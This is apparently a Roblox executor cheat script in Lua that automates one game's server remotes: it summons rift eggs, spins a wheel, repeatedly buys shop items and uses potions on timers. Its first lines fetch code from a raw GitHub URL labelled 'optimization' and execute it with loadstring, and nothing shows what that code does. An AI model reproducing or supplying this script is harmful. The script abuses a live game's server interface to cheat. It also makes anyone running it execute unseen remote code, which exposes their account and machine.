task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/refs/heads/main/optimization"))()
end)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local workspace = game:GetService("Workspace")

local function convertToRiftName(displayName)
    return displayName:gsub(" ", "-"):lower()
end

local function findRiftByName()
    local riftNameToFind = convertToRiftName(RIFT_EGG)
    if workspace:FindFirstChild("Rendered") and workspace.Rendered:FindFirstChild("Rifts") then
        for _, rift in pairs(workspace.Rendered.Rifts:GetChildren()) do
            if rift.Name == riftNameToFind then return rift end
        end
    end
end

local function executeSummon()
    if not findRiftByName() then
        local worlds = {"Minigame Paradise", "The Overworld"}
        local worldName = worlds[math.random(1, #worlds)]
        local args = {"SummonRift", {Type = "Egg", Time = 5, Name = RIFT_EGG, Luck = 5, World = worldName}}
        pcall(function()
            ReplicatedStorage:WaitForChild("Shared"):WaitForChild("Framework"):WaitForChild("Network"):WaitForChild("Remote"):WaitForChild("RemoteFunction"):InvokeServer(unpack(args))
        end)
    end
end

if AUTO_SUMMON then
    task.spawn(function()
        while true do
            if not findRiftByName() then
                executeSummon()
                task.wait(math.random(1, 60))
            else
                task.wait(60)
            end
        end
    end
end

local function spinWheel()
    local rf = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteFunction
    local re = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
    rf:InvokeServer("AutumnWheelSpin")
    task.wait(0.5)
    re:FireServer("ClaimAutumnWheelSpinQueue")
end

local function buyAutumnShop()
    local re = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
    for i = 1, 5 do
        re:FireServer("BuyShopItem","autumnnorm-shop",1,false)
        re:FireServer("BuyShopItem","autumnnorm-shop",2,false)
        re:FireServer("BuyShopItem","autumnnorm-shop",3,false)
    end
end
task.spawn(function()
    while true do
        spinWheel()
        buyAutumnShop()
        task.wait(1)
    end
end)
local potions = {
    {"Lucky", LUCKY_TIER, LUCKY_DELAY},
    {"Speed", SPEED_TIER, SPEED_DELAY},
    {"Mythic", MYTHIC_TIER, MYTHIC_DELAY},
    {"Coins", COINS_TIER, COINS_DELAY},
    {"Tickets", TICKETS_TIER, TICKETS_DELAY},
    {"Secret Elixir", 1, SECRET_ELIXIR_DELAY},
    {"Egg Elixir", 1, EGG_ELIXIR_DELAY},
    {"Infinity Elixir", 1, INFINITY_ELIXIR_DELAY}
}

getgenv().running = true

local lastUsed = {}

task.spawn(function()
    while getgenv().running do
        for _, potion in ipairs(potions) do
            local name, tier, delay = unpack(potion)
            local currentTime = os.time()
            if not lastUsed[name] or currentTime - lastUsed[name] >= delay * 60 then
                local args = {"UsePotion", name, tier}
                game:GetService("ReplicatedStorage").Shared.Framework.Network.Remote.RemoteEvent:FireServer(unpack(args))
                lastUsed[name] = currentTime
            end
        end
        task.wait(1)
    end
end)
